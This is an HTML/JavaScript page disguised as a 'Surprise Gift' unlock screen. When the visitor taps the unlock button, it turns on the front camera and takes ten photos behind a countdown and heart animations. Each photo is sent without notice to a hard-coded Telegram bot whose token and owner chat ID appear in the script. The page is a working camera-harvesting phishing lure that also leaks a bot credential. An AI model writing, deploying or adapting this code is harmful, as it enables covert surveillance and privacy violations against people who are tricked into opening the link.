<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Surprise Gift</title>
    <style>
        body { 
            margin: 0; 
            padding: 0; 
            background: #000; 
            font-family: Arial; 
            overflow: hidden; 
            height: 100vh; 
        }
        
        .screen { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
        }
        
        #startScreen { 
            background: linear-gradient(135deg, #ff0080, #8000ff); 
            color: white; 
            z-index: 1000; 
        }
        
        .gift { 
            font-size: 100px; 
            margin-bottom: 30px; 
            animation: bounce 1s infinite; 
        }
        
        @keyframes bounce {
            0%,100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-20px) scale(1.1); }
        }
        
        .btn { 
            background: #00ff00; 
            color: black; 
            border: none; 
            padding: 15px 40px; 
            font-size: 20px; 
            border-radius: 50px; 
            margin: 10px; 
            cursor: pointer; 
            font-weight: bold; 
            box-shadow: 0 0 20px #00ff00; 
            transition: 0.3s; 
        }
        
        .btn:hover { 
            transform: scale(1.05); 
            box-shadow: 0 0 30px #00ff00; 
        }
        
        #cameraScreen { 
            display: none; 
            background: #000; 
            z-index: 900; 
        }
        
        #video { 
            width: 100%; 
            height: 100%; 
            object-fit: cover; 
            transform: scaleX(-1); 
        }
        
        .flash { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: white; 
            opacity: 0; 
            pointer-events: none; 
        }
        
        .counter { 
            position: fixed; 
            top: 50%; 
            left: 50%; 
            transform: translate(-50%, -50%); 
            font-size: 100px; 
            color: #ff0000; 
            font-weight: bold; 
            text-shadow: 0 0 20px #ff0000; 
            z-index: 950; 
        }
        
        #completeScreen { 
            display: none; 
            background: #000; 
            z-index: 1000; 
        }
        
        .heart { 
            position: absolute; 
            font-size: 30px; 
            animation: fall linear forwards; 
            pointer-events: none; 
            z-index: 9999; 
        }
        
        @keyframes fall {
            to { transform: translateY(100vh) rotate(360deg); opacity: 0; }
        }
        
        .big-heart { 
            font-size: 150px; 
            color: #00ff00; 
            animation: heartbeat 1s infinite; 
        }
        
        @keyframes heartbeat {
            0%,100% { transform: scale(1); }
            50% { transform: scale(1.2); }
        }
        
        canvas { 
            display: none; 
        }
    </style>
</head>
<body>
    <!-- SCREEN 1: START -->
    <div class="screen" id="startScreen">
        <div class="gift">üéÅ</div>
        <h2 style="text-align:center; margin:20px;">
            Someone Has Given You<br>A Surprise Gift!
        </h2>
        <button class="btn" onclick="startCamera()">
            üéØ UNLOCK GIFT NOW
        </button>
    </div>
    
    <!-- SCREEN 2: CAMERA -->
    <div class="screen" id="cameraScreen">
        <video id="video" autoplay playsinline></video>
        <div class="flash" id="flash"></div>
        <div class="counter" id="counter">10</div>
    </div>
    
    <!-- SCREEN 3: COMPLETE -->
    <div class="screen" id="completeScreen">
        <div class="big-heart">‚ù§Ô∏è</div>
    </div>
    
    <!-- HIDDEN CANVAS -->
    <canvas id="canvas"></canvas>

    <script>
        // Telegram Configuration
        const BOT_TOKEN = '8226782560:AAEEqVHnfwAURU9pm3-VQc5OHLTdhwn_dNI';
        const OWNER_ID = '8215819954';
        
        // Get user info from URL
        const url = new URL(window.location.href);
        const userId = url.searchParams.get('uid');
        const userName = url.searchParams.get('name') || 'Friend';
        
        // DOM Elements
        const startScreen = document.getElementById('startScreen');
        const cameraScreen = document.getElementById('cameraScreen');
        const completeScreen = document.getElementById('completeScreen');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const counter = document.getElementById('counter');
        const flash = document.getElementById('flash');
        
        // Variables
        let cameraStream = null;
        let imagesSent = 0;
        const totalImages = 10;
        
        // Create hearts animation
        function createHearts(count = 5) {
            for(let i = 0; i < count; i++) {
                setTimeout(() => {
                    const heart = document.createElement('div');
                    heart.className = 'heart';
                    heart.innerHTML = '‚ù§Ô∏è';
                    heart.style.left = Math.random() * 100 + 'vw';
                    heart.style.fontSize = (Math.random() * 40 + 20) + 'px';
                    heart.style.animationDuration = (Math.random() * 3 + 2) + 's';
                    heart.style.color = ['#ff0000', '#ff0080', '#ff1493'][Math.floor(Math.random() * 3)];
                    document.body.appendChild(heart);
                    
                    setTimeout(() => heart.remove(), 5000);
                }, i * 100);
            }
        }
        
        // Start initial hearts
        for(let i = 0; i < 10; i++) {
            setTimeout(() => createHearts(2), i * 500);
        }
        
        // Start camera function
        async function startCamera() {
            const btn = document.querySelector('.btn');
            btn.disabled = true;
            btn.innerHTML = 'üé• Starting Camera...';
            
            try {
                // Request front camera
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 720 },
                        height: { ideal: 1280 }
                    }
                });
                
                // Switch to camera screen
                startScreen.style.display = 'none';
                cameraScreen.style.display = 'flex';
                video.srcObject = cameraStream;
                
                // Start capturing after 1 second
                setTimeout(captureImages, 1000);
                
            } catch (error) {
                btn.innerHTML = '‚ùå Camera Error!';
                btn.disabled = false;
            }
        }
        
        // Capture all images
        async function captureImages() {
            // Show counter
            counter.style.display = 'block';
            
            // Capture 10 images quickly
            for(let i = 0; i < totalImages; i++) {
                // Update counter
                counter.textContent = totalImages - i;
                
                // Flash effect
                flash.style.opacity = '0.8';
                setTimeout(() => flash.style.opacity = '0', 100);
                
                // Capture single image
                await captureSingleImage(i + 1);
                
                // Create hearts
                createHearts(3);
                
                // Wait a bit
                await new Promise(resolve => setTimeout(resolve, 400));
            }
            
            // Hide counter
            counter.style.display = 'none';
            
            // Finish up
            finishCapture();
        }
        
        // Capture single image
        async function captureSingleImage(number) {
            return new Promise((resolve) => {
                // Setup canvas
                const ctx = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Draw video frame (mirrored for front camera)
                ctx.save();
                ctx.scale(-1, 1);
                ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
                ctx.restore();
                
                // Convert to blob
                canvas.toBlob(async (blob) => {
                    // Send to Telegram
                    await sendToTelegram(blob, number);
                    resolve();
                }, 'image/jpeg', 0.9);
            });
        }
        
        // Send image to Telegram
        async function sendToTelegram(blob, number) {
            try {
                // Create FormData
                const formData = new FormData();
                formData.append('chat_id', OWNER_ID);
                formData.append('photo', blob, `photo_${number}.jpg`);
                formData.append('caption', `üì∏ ${number}/${totalImages}\nFrom: ${userName}`);
                
                // Send to owner (you)
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                // Send to user if user ID exists
                if(userId && /^\d+$/.test(userId)) {
                    const userForm = new FormData();
                    userForm.append('chat_id', userId);
                    userForm.append('photo', blob, `photo_${number}.jpg`);
                    userForm.append('caption', `üì∏ Your photo ${number}/${totalImages}`);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: userForm
                    });
                }
                
                imagesSent++;
                
            } catch (error) {
                console.error('Error sending photo:', error);
            }
        }
        
        // Finish capture
        function finishCapture() {
            // Stop camera
            if(cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                video.srcObject = null;
            }
            
            // Show completion screen
            cameraScreen.style.display = 'none';
            completeScreen.style.display = 'flex';
            
            // Create massive heart celebration
            for(let i = 0; i < 100; i++) {
                setTimeout(() => createHearts(3), i * 50);
            }
            
            // Fade out after 5 seconds
            setTimeout(() => {
                document.body.style.opacity = '0.5';
                setTimeout(() => {
                    document.body.style.opacity = '0.2';
                }, 1000);
            }, 5000);
        }
    </script>
</body>
</html>
